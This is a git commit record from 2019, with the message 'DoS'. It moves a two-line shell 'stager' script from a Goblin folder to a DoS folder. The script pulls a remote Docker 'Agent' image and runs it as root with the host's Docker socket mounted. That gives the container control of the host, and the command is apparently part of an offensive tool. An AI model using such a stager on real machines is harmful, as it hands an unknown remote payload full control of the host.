5403e76c714bd0188380dd9ad287c55f2739c93d
ilcapone <juanzumbido@hotmail.com>
2019-08-27 17:31:32 +0200

    DoS

---
+++ DoS/Stager/stager_container.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+docker run -u root -v /var/run/docker.sock:/var/run/docker.sock ilcapone/onering:v6-Agent
--- Goblin/Stager/stager_container.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/sh
-docker run -u root -v /var/run/docker.sock:/var/run/docker.sock ilcapone/onering:v5-Agent
